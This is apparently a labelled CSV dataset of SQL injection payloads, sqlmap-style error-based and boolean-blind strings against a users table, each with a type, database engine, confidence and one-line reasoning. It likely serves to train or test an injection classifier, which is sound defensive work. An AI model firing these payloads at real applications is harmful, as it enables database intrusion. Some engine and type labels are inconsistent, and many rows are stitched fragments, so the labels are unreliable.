id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
38435,"select * from users WHERE username = ""-5863"" and username = ""1%\' ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( \'%\' = \'"" and username = ""1 ) ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) )",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38436,"-6190\' ) where 2621 = 2621 or username = ""-1254",unknown,generic,0.50,Insufficient data to classify payload type,1
38437,"select * from users WHERE username = ""-8057\' ) ) as gpue where 4205 = 4205 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" and username = ""1\'|| ( select \'vasx\' where 4770 = 4770",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38438,"select * from users WHERE username = ""-5291\' ) ) or username = ""-7072\' ) or username = ""1 where 5161 = 5161",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38439,"-1190\' and username = ""-1985 ) ) ) and ( ( ( 1248 = 1248"" or username = ""-8163 ) ) as cvai where 2360 = 2360 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38440,"1\' ) ) as plbt where 4368 = 4368 or username = ""1 and ( \'ulkq\' = \'ulkq",unknown,generic,0.50,Insufficient data to classify payload type,1
38441,"select * from users WHERE username = ""1\' ) ) ) and ( ( ( \'cbnc\' like \'cbnc"" or username = ""1 ) as nbno where 9816 = 9816",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38442,"select * from users WHERE username = ""1 where 5161 = 5161 or username = ""-4322\' ) ) as magw where 1627 = 1627 or# 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --"" or username = ""1 ) ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) )",error_based,mssql,0.85,Error Based detected: character extraction (mssql),1
38443,1\'|| ( select \'yucg\' where 2576 = 2576 and ( ( \'ybgd\' = \'ybgd,unknown,generic,0.50,Insufficient data to classify payload type,1
38444,"select * from users WHERE username = ""-3859 ) or username = ""-7072\' ) and username = ""-6203\' ) ) )",boolean_blind,generic,0.70,Boolean Blind detected: SQL structure with complex syn,1
38445,"SELECT * FROM users WHERE username = ""1 where 5161 = 5161 AND username = ""1\' ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38446,"1\' where 8537 = 8537 and username = ""1 and username = ""1\' ) and ( \'ulkq\' = \'ulkq",unknown,generic,0.50,Insufficient data to classify payload type,1
38447,"-2154%\' or username = ""-9668\' ) ) as orfu where 5822 = 5822 or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --",error_based,mssql,0.85,Error Based detected: character extraction (mssql),1
38448,-3899\' ) where 8152 = 8152 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --,error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38449,"select * from users WHERE username = ""1\' ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and username = ""1\'",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38450,"select * from users WHERE username = ""-5313\' ) ) ) and ( ( ( \'wkkp\' like \'wkkp"" or username = ""1 ) ) as dgso where 4654 = 4654",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38451,"1%\' ) ) ) or username = ""-1889%\' ) ) ) and username = ""-1641\' ) ) or ( ( 5299 = 5299",unknown,generic,0.50,Insufficient data to classify payload type,1
38452,1%\' ) ) and ( ( \'%\' = \',unknown,generic,0.50,Insufficient data to classify payload type,1
38453,"select * from users WHERE username = ""1\' ) ) or username = ""-9501\' ) or username = ""-2756\' where 6156 = 6156",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38454,"-7951\' ) ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and username = ""1\' and username = ""1 ) ) and ( ( 5139 = 5139",error_based,mssql,0.85,Error Based detected: character extraction (mssql),1
38455,"select * from users WHERE username = ""-5880\' ) ) and ( ( \'rwgl\' = \'rwgl"" and username = ""1\' ) ) )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38456,"-7199\' and username = ""-9564 or username = ""1"" and ( ( \'%\' = \'",unknown,generic,0.50,Insufficient data to classify payload type,1
38457,"1\' ) and username = ""1%\' ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( \'%\' = \'",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38458,"1\'|| ( select \'rjis\' from dual where 7696 = 7696 or username = ""-1854\' ) as fmmq where 7326 = 7326 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38459,"select * from users WHERE username = ""1\' ) where 1502 = 1502 and username = ""1\' ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38460,-2733\' ) ) ) and ( ( ( \'btjx\' = \'btjx,unknown,generic,0.50,Insufficient data to classify payload type,1
38461,"select * from users WHERE username = ""-9505\' ) ) ) and ( ( ( \'qhdg\' = \'qhdg"" and username = ""1%\' ) ) ) or username = ""1\' ) ) )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38462,"select * from users WHERE username = ""1 ) as nbno where 9816 = 9816 and ( ( ( \'mfmk\' = \'mfmk"" or username = ""-5062 ) where 7457 = 7457",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38463,"select * from users WHERE username = ""-9501\' ) and ( \'mndw\' = \'mndw"" or username = ""-7430\' ) as xfah where 1596 = 1596",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38464,-9668\' ) ) as orfu where 5822 = 5822 or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --,error_based,mssql,0.85,Error Based detected: character extraction (mssql),1
38465,"select * from users WHERE username = ""1\'+ ( select onzd where 8452 = 8452 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ) +\'"" or username = ""-9295 ) ) ) and ( ( ( 8752 = 8752"" or username = ""-4582 ) ) as gvfo where 8885 = 8885",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38466,"select * from users WHERE username = ""1"" and username = ""1 and username = ""1%\' and username = ""-9564 and username = ""-6190\' ) where 2621 = 2621",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38467,"1\' ) or username = ""-2756\' where 6156 = 6156 or username = ""-7323%"" and ""%"" = """,unknown,generic,0.50,Insufficient data to classify payload type,1
38468,"-7951\' ) ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) or username = ""1\' or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38469,"select * from users WHERE username = ""-6523"" and username = ""-6720\' ) ) ) or ( ( ( \'enfe\' like \'enfe"" or username = ""1 where 5161 = 5161 or username = ""-4322\' ) ) as magw where 1627 = 1627",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38470,"-6720\' ) ) ) and username = ""1\' and ( ( 5616 = 5616",unknown,generic,0.50,Insufficient data to classify payload type,1
38471,"select * from users WHERE username = ""1\' ) ) and ( ( \'ajka\' = \'ajka"" or username = ""1\' )",boolean_blind,generic,0.70,Boolean Blind detected: SQL structure with complex syn,1
38472,"1 ) ) as atiy where 3855 = 3855 or username = ""1%\' ) ) ) and ( ( ( \'%\' = \'",unknown,generic,0.50,Insufficient data to classify payload type,1
38473,"-8057\' ) ) as gpue where 4205 = 4205 and username = ""-3978 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38474,"select * from users WHERE username = ""1"" and username = ""1\' ) where 1502 = 1502",boolean_blind,generic,0.70,Boolean Blind detected: SQL structure with complex syn,1
38475,"-6190\' ) where 2621 = 2621 and username = ""1",unknown,generic,0.50,Insufficient data to classify payload type,1
38476,"select * from users WHERE username = ""1\'|| ( select \'tisi\' from dual where 1616 = 1616 and username = ""-8057\' ) ) as gpue where 4205 = 4205 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" and username = ""1\'+ ( select onzd where 8452 = 8452",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38477,"select * from users where username = ""-5013\' ) ) ) || 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) )",error_based,mssql,0.85,Error Based detected: character extraction (mssql),1
38478,"1\' ) where 1502 = 1502 and username = ""-9501\' ) and ( \'mndw\' = \'mndw",unknown,generic,0.50,Insufficient data to classify payload type,1
38479,"select * from users WHERE username = ""-1889%\' ) ) ) and username = ""-1641\' ) ) or username = ""-3733\' ) )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38480,"select * from users WHERE username = ""-9501\' ) or username = ""1 ) ) ) and ( ( ( 4694 = 4694"" and username = ""-2756\' where 6156 = 6156 and username = ""-1549\' )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38481,"select * from users WHERE username = ""-9553 ) ) or ( ( 5299 = 5299"" or username = ""1"" or username = ""-5062 ) where 7457 = 7457",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38482,"-3185\' ) ) and username = ""1\' ) ) and ( ( \'ajka\' = \'ajka",unknown,generic,0.50,Insufficient data to classify payload type,1
38483,"select * from users WHERE username = ""-3880 ) and ( 5194 = 5194"" or username = ""-7962\' ) ) as pgqz where 6058 = 6058 and username = ""-7430\' ) as xfah where 1596 = 1596",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38484,"select * from users WHERE username = ""1\' ) ) ) and ( ( ( \'ugoz\' = \'ugoz"" and username = ""-1344 ) as gqgi where 2545 = 2545",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38485,"SELECT * FROM users WHERE username = ""1\' ) ) as bswc where 1635 = 1635 AND username = ""1\' ) ) as plbt where 4368 = 4368",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38486,"select * from users WHERE username = ""-8007\' ) ) as bgpp where 9555 = 9555 or username = ""-7720 ) ) and username = ""-8860 ) and username = ""-2756\' where 6156 = 6156",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38487,"1\' and username = ""1\' ) ) and ( \'mndw\' = \'mndw"" or username = ""1 ) ) ) and ( ( ( 4694 = 4694",unknown,generic,0.50,Insufficient data to classify payload type,1
38488,"-7199\' or \'qibr\' = \'qibr"" and ( ( ( \'%\' = \'",unknown,generic,0.50,Insufficient data to classify payload type,1
38489,"1%\' ) and username = ""1\'|| ( select \'yucg\' where 2576 = 2576 and username = ""-3733\' ) ) and ( ( \'ybgd\' = \'ybgd",unknown,generic,0.50,Insufficient data to classify payload type,1
38490,-8163 ) ) as cvai where 2360 = 2360 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --,error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38491,"select * from users WHERE username = ""-3424\' ) ) and username = ""-1254"" and username = ""1",boolean_blind,generic,0.70,Boolean Blind detected: SQL structure with complex syn,1
38492,"select * from users WHERE username = ""1\'|| ( select \'tisi\' from dual where 1616 = 1616 or username = ""-1254"" and username = ""1 ) where 3381 = 3381",boolean_blind,oracle,0.85,Boolean Blind detected: SQL structure with complex syn (oracle),1
38493,"-9668\' ) ) as orfu where 5822 = 5822 and username = ""1 ) ) and ( ( 6659 = 6659",unknown,generic,0.50,Insufficient data to classify payload type,1
38494,"select * from users WHERE username = ""-5585\' or username = ""-9688%\' ) ) and ( ( \'%\' = \'"" or username = ""-8007\' ) ) as bgpp where 9555 = 9555",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38495,1 ) as zmxb where 8424 = 8424 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --,error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38496,1\' ) ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( \'yxpi\' = \'yxpi,error_based,mssql,0.85,Error Based detected: character extraction (mssql),1
38497,"select * from users WHERE username = ""-1641\' ) ) and ( ( \'vgcb\' like \'vgcb"" or username = ""1 ) )",boolean_blind,generic,0.70,Boolean Blind detected: SQL structure with complex syn,1
38498,"1\' ) where 1502 = 1502 and username = ""1 ) where 6039 = 6039 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38499,"select * from users WHERE username = ""1\' ) ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( \'yxpi\' = \'yxpi"" and username = ""-5152\' ) ) || 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) )",error_based,mssql,0.85,Error Based detected: character extraction (mssql),1
38500,"select * from users WHERE username = ""-1190\' or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( \'xopg\' = \'xopg"" and username = ""1 ) ) )",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38501,"-1889%\' ) ) ) and username = ""-1641\' ) ) and username = ""1\' ) as pogx where 4105 = 4105 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38502,"select * from users WHERE username = ""1\' ) ) and ( \'mndw\' = \'mndw"" or username = ""1 ) ) ) and ( ( ( 4694 = 4694"" and username = ""-8163 ) ) as cvai where 2360 = 2360",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38503,"select * from users WHERE username = ""-8112\' ) ) ) and ( ( ( \'xopg\' = \'xopg"" or username = ""1\'|| ( select \'tisi\' from dual where 1616 = 1616 and username = ""-8057\' ) ) as gpue where 4205 = 4205",boolean_blind,oracle,0.85,Boolean Blind detected: SQL structure with complex syn (oracle),1
38504,"1\' ) and username = ""-5863"" and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( \'%\' = \'",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38505,"select * from users WHERE username = ""1\' ) ) ) and ( ( ( \'ykjs\' like \'ykjs"" and username = ""-8021\' ) )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38506,"-4952\' ) ) ) and username = ""-9987 ) ) ) or ( ( ( 2114 = 2114",unknown,generic,0.50,Insufficient data to classify payload type,1
38507,"select * from users WHERE username = ""1 and username = ""-5863"" and username = ""-1344 ) as gqgi where 2545 = 2545",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38508,"select * from users WHERE username = ""-8828%\' ) ) ) or username = ""1%\' ) ) ) and ( ( ( \'%\' = \'"" and username = ""1\'+ ( select vohg where 6383 = 6383",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38509,"-7184 ) as fshx where 3408 = 3408 and username = ""1\' ) ) and ( ( \'yhku\' like \'yhku",unknown,generic,0.50,Insufficient data to classify payload type,1
38510,"select * from users WHERE username = ""1%\' ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and username = ""-1344 ) as gqgi where 2545 = 2545 and username = ""1\' )",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38511,"select * from users WHERE username = ""1%\' ) ) ) and ( ( ( \'%\' = \'"" or username = ""1\' ) ) ) and username = ""1"" and username = ""1\'+ ( select \'kicv\' where 1976 = 1976",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38512,"1\' or username = ""-4610\' ) ) and ( ( \'hdco\' = \'hdco",unknown,generic,0.50,Insufficient data to classify payload type,1
38513,"select * from users WHERE username = ""1\' ) ) ) or username = ""-1344 ) as gqgi where 2545 = 2545 and username = ""1\' )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38514,"select * from users WHERE username = ""-7209\' ) ) ) and ( ( ( \'stqx\' = \'stqx"" or username = ""1%\' and username = ""-9564",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38515,"1\' in boolean mode ) or username = ""1\'+ ( select \'ueak\' where 7329 = 7329 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ) +\'",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38516,"1\'|| ( select \'rjis\' from dual where 7696 = 7696 or username = ""-1190\' and \'yxry\' like \'yxry"" and username = ""-8112\' ) ) ) and ( ( ( \'xopg\' = \'xopg",boolean_blind,oracle,0.85,Boolean Blind detected: SQL structure with complex syn (oracle),1
38517,"1\' ) ) as plbt where 4368 = 4368 and username = ""-7430\' ) as xfah where 1596 = 1596 and username = ""1\'|| ( select \'byxb\' where 8351 = 8351 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ) ||\'",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38518,"select * from users WHERE username = ""1\' ) ) ) and ( ( ( \'mfmk\' = \'mfmk"" or username = ""-1190\' or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38519,"select * from users WHERE username = ""-2348 ) as sige where 1639 = 1639 or username = ""-3733\' ) ) or username = ""-6190\' ) where 2621 = 2621",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38520,"select * from users WHERE username = ""1"" and username = ""1\'+ ( select oljg where 2006 = 2006 or username = ""-2154%\'",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38521,"1\' ) ) as bswc where 1635 = 1635 or username = ""-9501\' ) or username = ""1\' ) ) ) or ( ( 5299 = 5299",unknown,generic,0.50,Insufficient data to classify payload type,1
38522,"1\' and username = ""-1549\' ) or username = ""-9644 ) ) and username = ""1"" and ( ( \'%\' = \'",unknown,generic,0.50,Insufficient data to classify payload type,1
38523,"select * from users WHERE username = ""-9564 and username = ""-6190\' ) where 2621 = 2621 and username = ""-1344 ) as gqgi where 2545 = 2545 and username = ""1\' )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38524,"select * from users WHERE username = ""1%"" or username = ""1\' ) ) and ( ( \'qtul\' like \'qtul"" and username = ""1\'|| ( select \'byxb\' where 8351 = 8351",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
